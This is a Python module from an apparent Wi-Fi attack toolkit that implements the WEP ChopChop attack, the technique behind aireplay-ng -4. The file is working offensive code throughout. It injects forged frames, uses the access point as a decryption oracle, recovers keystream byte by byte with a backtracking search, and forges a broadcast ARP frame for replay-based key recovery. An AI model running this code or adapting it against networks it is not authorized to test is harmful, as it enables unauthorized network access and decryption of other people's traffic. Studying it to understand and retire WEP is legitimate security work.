"""WEP ChopChop attack (`aireplay-ng -4`) — M6.

Decrypts a captured frame byte-by-byte using the AP as an ICV oracle, no key:
chop the last byte, guess its plaintext (≤256), fix the ICV
(wep_crypto.chop_last_byte_and_fixup — CRC32 is linear), re-header to
broadcast-from-us, send. The AP relays the shortened frame IFF the guess was
right (verified on hardware: only the one valid-ICV guess relays; the latency
is ~3ms). Walk backwards recovering one keystream byte per accepted guess →
enough keystream to forge a broadcast ARP → hand to replay.

ORACLE (pinned from the probe, scripts/wep/chopchop_probe.py): a Data frame,
FromDS + Protected, Addr1(DA)=broadcast, **Addr3(SA)=our forged STA**, ~1 byte
shorter than what we sent. Match on SA (the box echoes onto sibling BSSes, so
de-dup); per-guess relay timeout ~20ms (3ms observed + margin).

Keystream recovery (the offline-testable core, `_recover_keystream`): the
keystream is fixed per IV, so at each chop step the accepted guess gives the
original keystream byte directly — ks[i] = body[i] XOR guess — recovered from
the end inward. The first 16 plaintext bytes of a broadcast ARP are known
(LLC/SNAP + ARP-request header), so we only chop the variable tail (positions
16..39) and fill ks[0..15] from the known prefix; that also avoids chopping the
frame down to a too-short-to-relay size.

Lifecycle mirrors WepFragmentation (start/stop/state, on_forged_arp, keep-
retrying). No sw_seq needed (single frames, not a reassembled train). Slower
than fragmentation (≤256 round-trips/byte) — the user-chosen fallback when frag
gets no response. The campaign pauses replay before running this and resumes it
on success with the forged ARP.
"""

from __future__ import annotations

import asyncio
import logging
import time
from typing import Awaitable, Callable, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks.wep.wep_crypto import (
    arp_request_plaintext,
    chop_last_byte_and_fixup,
    icv,
)

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6
# Known plaintext prefix of a broadcast ARP REQUEST: LLC/SNAP (6) + ethertype
# 0x0806 (2) + ARP htype/ptype/hlen/plen/op-request (8) = 16 bytes. ks[0..15] =
# cipher[0..15] XOR this, so we don't chop them (and don't shrink the frame to a
# too-short-to-relay size). Assumes the captured broadcast frame is an ARP
# request — overwhelmingly true for broadcast; a stray reply just yields a bad
# forge that replay won't lock onto, and we move to another seed.
_KNOWN_ARP16 = bytes([
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, 0x08, 0x06,
    0x00, 0x01, 0x08, 0x00, 0x06, 0x04, 0x00, 0x01,
])


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _hdr_len(fc0: int, fc1: int) -> int:
    n = 24
    if (fc1 & 0x01) and (fc1 & 0x02):
        n += 6
    if ((fc0 & 0xF0) >> 4) & 0x08:
        n += 2
    if fc1 & 0x80:
        n += 4
    return n


class WepChopChop:
    """ChopChop daemon: chop a captured ARP byte-by-byte via the AP oracle →
    recover keystream → forge a broadcast ARP → hand to replay."""

    # Per-guess wait for the relay (oracle). ~3ms observed on hardware + margin.
    _ORACLE_TIMEOUT_S = 0.02
    _ORACLE_POLL_S = 0.002
    # A byte that yields no relay across all 256 guesses gets one re-sweep (the
    # correct guess's single send may have been lost) before we give up on the
    # seed.
    _BYTE_RETRIES = 2
    _HEARTBEAT_S = 5.0
    # The AP stops relaying frames once they get too short, so the last
    # keystream byte(s) just above the known prefix can be unreachable by
    # chopping. We brute-force a gap this small with FULL-length forged frames
    # (well above the size wall): 1 byte = 256 candidates, the valid one relays.
    _MAX_BRUTE_BYTES = 1

    def __init__(
        self,
        iface,
        target: AccessPoint,
        store,
        source_mac: bytes,
        on_forged_arp: Callable[[bytes], None],
        can_inject: Optional[Callable[[], bool]] = None,
        notify_activity: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
        sender_ip: bytes = bytes([192, 168, 1, 123]),
        target_ip: bytes = bytes([192, 168, 1, 1]),
        oracle: Optional[Callable[[bytes], Awaitable[bool]]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = _str_to_mac(target.bssid)
        self.store = store
        self.source_mac = source_mac
        self._on_forged_arp = on_forged_arp
        self._can_inject = can_inject or (lambda: True)
        # Our guesses ARE activity — feed this so fake-auth's periodic keepalive
        # re-auth doesn't fire mid-chop (a long byte-walk would otherwise hit
        # the inactivity timer and re-auth in the middle of guessing).
        self._notify_activity = notify_activity or (lambda: None)
        self._log = log_callback or (lambda _m: None)
        self._sender_ip = sender_ip
        self._target_ip = target_ip
        # The oracle is injectable so the byte-walk is unit-testable offline
        # (a simulated decrypt-and-check-ICV). Default = the live AP.
        self._oracle = oracle or self._hw_oracle

        self.state = "idle"        # idle|waiting-auth|seeding|chopping|success
        self._active = False
        self._task: Optional[asyncio.Task] = None
        self._tried: set = set()   # seed IVs that stalled
        self._bytes_done = 0       # progress for the UI
        self._bytes_total = 0

        # Current chop target's IV + KeyID + cipher (for frames / forging /
        # verifying the seed is really an ARP request).
        self._cur_iv = b""
        self._cur_keyid = 0
        self._cur_cipher = b""
        # Oracle signal: set by the RX callback when the AP relays our frame.
        self._relay_seen = False
        # Length the relay must match THIS guess. Critical: a correct guess can
        # echo onto sibling BSSes (2+ relays); the late echo from byte N lands
        # during byte N+1's sweep — but byte N's relay is 1 byte LONGER, so
        # matching the exact expected length rejects the stale echo (else it
        # false-accepts the next byte → corrupts the walk → stalls).
        self._expected_relay_len = 0
        self._last_heartbeat = 0.0

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._loop())
        logger.info("[WEP-Chop] Started on %s as %s",
                    self.bssid, self.source_mac.hex())

    def stop(self):
        if not self._active:
            return
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info("[WEP-Chop] Stopped (%d bytes recovered).", self._bytes_done)

    @property
    def is_active(self) -> bool:
        return self._active

    # ---- Seed selection -----------------------------------------------------

    def _wep_body(self, captured: bytes):
        """(iv, keyid, cipher) from a captured broadcast WEP frame, or None."""
        if len(captured) < 28:
            return None
        body = captured[_hdr_len(captured[0], captured[1]):]
        if len(body) < 44:                 # need IV+KeyID + >=40B cipher (ARP)
            return None
        return body[:3], body[3], body[4:]

    def _pick_target(self) -> bool:
        """Choose a not-yet-stalled captured broadcast ARP to chop."""
        for raw in reversed(self.store.arp_candidates(self.bssid)):
            parsed = self._wep_body(raw)
            if not parsed:
                continue
            iv, keyid, cipher = parsed
            if iv in self._tried:
                continue
            self._cur_iv, self._cur_keyid, self._cur_cipher = iv, keyid, cipher
            self._bytes_done = 0
            self._bytes_total = len(cipher) - len(_KNOWN_ARP16)
            self._log(
                f"[green]ChopChop:[/green] chopping IV {iv.hex()} "
                f"[dim]({len(cipher)}B cipher, {self._bytes_total} bytes to "
                f"recover)[/dim]"
            )
            return cipher
        return None

    # ---- The byte-walk: backtracking DFS over relayed candidates ------------

    async def _chop_and_forge(self, cipher: bytes) -> Optional[bytes]:
        """Recover the keystream by chopping ``cipher`` to the known ARP prefix,
        then forge + return a broadcast ARP frame the AP relays — or None.

        DFS, NOT a single linear walk: at each step the AP may relay MORE than
        one byte value (its real behavior — vendor quirk / echo, doesn't matter
        why). We don't guess which is "real": we try each branch, and a wrong
        byte produces a corrupt frame whose sub-walk dies fast → we backtrack
        and try the next. The TRUE path is the only one that reaches the prefix
        AND yields a forged ARP the AP actually relays. Zero faith required in
        any "first byte is the right one" heuristic."""
        nknown = len(_KNOWN_ARP16)
        if len(cipher) < nknown + 4:
            return None
        known_ks = bytes(cipher[i] ^ _KNOWN_ARP16[i] for i in range(nknown))
        return await self._dfs(bytes(cipher), {}, nknown, known_ks, len(cipher))

    async def _dfs(self, body, ks_map, nknown, known_ks, full_len):
        """One chop step. ks_map: {position: recovered keystream byte} so far."""
        if not self._active:
            return None
        self._bytes_done = max(self._bytes_done, full_len - len(body))
        self._maybe_heartbeat()
        if len(body) <= nknown:
            # Chopped all the way to the known prefix — forge with the full
            # keystream and let the AP confirm it (validates the whole path).
            return await self._forge_and_validate(ks_map, known_ks, full_len, [])

        candidates = await self._find_all_accepted(body)
        if not candidates:
            # No byte relayed: either the too-short-to-relay wall (a small,
            # brute-forceable gap remains) or a dead branch (gap too big).
            gap = list(range(nknown, len(body)))
            if 0 < len(gap) <= self._MAX_BRUTE_BYTES:
                return await self._forge_and_validate(
                    ks_map, known_ks, full_len, gap
                )
            return None

        pos = len(body) - 1
        for cand in candidates:
            ks_map[pos] = body[-1] ^ cand
            forged = await self._dfs(
                chop_last_byte_and_fixup(body, cand),
                ks_map, nknown, known_ks, full_len,
            )
            if forged is not None:
                return forged
            del ks_map[pos]               # backtrack: this byte led nowhere
        return None

    async def _find_all_accepted(self, body: bytes) -> list:
        """Sweep all 256 guesses; return EVERY byte the AP relays (re-confirmed)
        — the branch set for the DFS. Re-sweeps once if it found none (a lost
        send), so a real chopping wall is distinguished from packet loss."""
        for _attempt in range(self._BYTE_RETRIES):
            responders = []
            for guess in range(256):
                if not self._active:
                    return responders
                shortened = chop_last_byte_and_fixup(body, guess)
                if await self._oracle(shortened) and await self._confirm(shortened):
                    responders.append(guess)
            if responders:
                return responders
        return []

    async def _confirm(self, shortened: bytes) -> bool:
        """Re-send a relaying guess to confirm it's the true byte, not a
        misattributed relay. Two tries (tolerates a single re-send loss)."""
        for _ in range(2):
            if not self._active:
                return False
            if await self._oracle(shortened):
                return True
        return False

    # ---- Live-AP oracle -----------------------------------------------------

    def _build_frame(self, body_cipher: bytes) -> bytes:
        """Re-header a (chopped or forged) cipher to a broadcast frame from us,
        reusing the chop target's IV + KeyID."""
        hdr = (b"\x08\x41" + b"\x00\x00"        # Data, ToDS=1, Protected=1
               + self.bssid_bytes + self.source_mac + _BROADCAST + b"\x00\x00")
        return hdr + self._cur_iv + bytes([self._cur_keyid]) + body_cipher

    async def _hw_oracle(self, shortened_cipher: bytes) -> bool:
        """Send the chopped frame and watch for the AP relaying it (the pinned
        signature, in _rx_cb). True = relayed = the guess was correct."""
        # Don't burn guesses while de-associated (a reactive re-auth in flight)
        # — wait briefly for the association to come back, so we never miss the
        # correct guess by sending it into the void.
        waited = 0.0
        while self._active and not self._can_inject() and waited < 5.0:
            await asyncio.sleep(0.1)
            waited += 0.1
        frame = self._build_frame(shortened_cipher)
        # The AP re-encrypts the same-length shortened payload, so the relay is
        # exactly as long as what we sent — match on that to reject stale echoes
        # from the previous (longer) chop step.
        self._expected_relay_len = len(frame)
        self._relay_seen = False
        try:
            await self.iface.send_raw(frame, use_no_ack=True)
        except Exception:
            logger.exception("[WEP-Chop] send_raw failed")
            return False
        self._notify_activity()   # keep the assoc alive — no periodic re-auth
        deadline = time.time() + self._ORACLE_TIMEOUT_S
        while time.time() < deadline:
            if self._relay_seen:
                return True
            await asyncio.sleep(self._ORACLE_POLL_S)
        return self._relay_seen

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        """Pinned oracle signature: Data + FromDS + Protected + DA=broadcast +
        Addr3(SA)==our STA. Match on SA (box echoes onto sibling BSSes)."""
        if not self._active or len(frame) < 24:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2 or not (fc1 & 0x40):    # data + Protected
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):                # FromDS, not ToDS
            return
        if frame[4:10] != _BROADCAST:                       # DA broadcast
            return
        if frame[16:22] != self.source_mac:                 # SA == us
            return
        if len(frame) != self._expected_relay_len:          # THIS guess's relay
            return                                          # (rejects stale echo)
        self._relay_seen = True

    # ---- Main loop ----------------------------------------------------------

    async def _loop(self) -> None:
        try:
            while self._active:
                if not self._can_inject():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.2)
                    continue
                cipher = self._pick_target()
                if not cipher:
                    self._set_state("seeding")
                    await asyncio.sleep(0.3)
                    self._maybe_heartbeat()
                    continue

                self._set_state("chopping")
                forged = await self._chop_and_forge(cipher)
                if not self._active:
                    return
                if forged is None:
                    # Every branch dead-ended (AP went quiet, or the wall left
                    # an un-brute-forceable gap) — blacklist this seed, try
                    # another. Keep retrying (never auto-stop), per the design.
                    self._log(
                        "[yellow]ChopChop: couldn't recover from this seed[/yellow] "
                        "[dim](trying another)[/dim]"
                    )
                    self._tried.add(self._cur_iv)
                    continue
                self._succeed(forged)
                return
        except asyncio.CancelledError:
            pass

    async def _forge_and_validate(self, ks_map, known_ks, full_len, gap):
        """Leaf of the DFS: assemble the keystream (recovered bytes + known
        prefix), forge a broadcast ARP, and CONFIRM the AP relays it — that
        relay is what validates the whole recovered path. A ``gap`` (the
        too-short chopping wall) is brute-forced (vary the gap cipher byte over
        256 full-length forged ARPs). Returns the relayed forged frame, or None
        (→ the DFS backtracks)."""
        nknown = len(known_ks)
        ks = bytearray(full_len)
        for pos, val in ks_map.items():
            ks[pos] = val
        ks[:nknown] = known_ks
        # VERIFY the seed really is an ARP REQUEST before trusting the assumed
        # 16-byte prefix: its target-MAC (plaintext 26..31) must be all-zero,
        # and we recovered ks[26..31] by chopping (prefix-independent). If not,
        # this broadcast frame isn't an ARP request — our prefix is wrong, so
        # the forge can't work. Skip it (this is the likely "chops fine, then
        # nada": chop is prefix-independent + succeeds, forge needs the prefix).
        if all(p in ks_map for p in range(26, 32)) and len(self._cur_cipher) >= 32:
            tmac = bytes(self._cur_cipher[p] ^ ks[p] for p in range(26, 32))
            if tmac != b"\x00" * 6:
                self._log(
                    "[yellow]ChopChop: seed is NOT an ARP request[/yellow] "
                    f"[dim](decrypted target-MAC = {tmac.hex()}, expected 0s — "
                    "the assumed ARP prefix is wrong; skipping this seed)[/dim]"
                )
                return None
        plain = arp_request_plaintext(
            sender_mac=self.source_mac,
            sender_ip=self._sender_ip, target_ip=self._target_ip,
        )
        full = plain + icv(plain)                          # 40 B known plaintext
        cipher = bytearray(p ^ ks[i] for i, p in enumerate(full))
        brute = gap[0] if gap else None                    # _MAX_BRUTE_BYTES == 1
        if brute is not None:
            self._log(
                "[green]ChopChop:[/green] [dim]chopping wall hit — brute-forcing "
                "the last byte (256 forged ARPs)…[/dim]"
            )
        for _attempt in range(self._BYTE_RETRIES):
            for g in (range(256) if brute is not None else (None,)):
                if not self._active:
                    return None
                if brute is not None:
                    cipher[brute] = g
                cand = bytes(cipher)
                if await self._oracle(cand) and await self._confirm(cand):
                    return self._build_frame(cand)
        return None

    def _succeed(self, forged: bytes) -> None:
        self._set_state("success")
        self._log(
            "[green]✓ ChopChop recovered keystream[/green] [dim](forged a "
            "broadcast ARP — handing to replay)[/dim]"
        )
        # Immediate handoff (mirrors frag): stop, hand the forged ARP over.
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        try:
            self._on_forged_arp(forged)
        except Exception:
            logger.exception("[WEP-Chop] on_forged_arp callback failed")

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        self.state = state

    def _maybe_heartbeat(self) -> None:
        now = time.time()
        if now - self._last_heartbeat < self._HEARTBEAT_S:
            return
        self._last_heartbeat = now
        if self.state == "chopping":
            self._log(
                f"[green]ChopChop:[/green] [dim]byte {self._bytes_done}/"
                f"{self._bytes_total} recovered…[/dim]"
            )
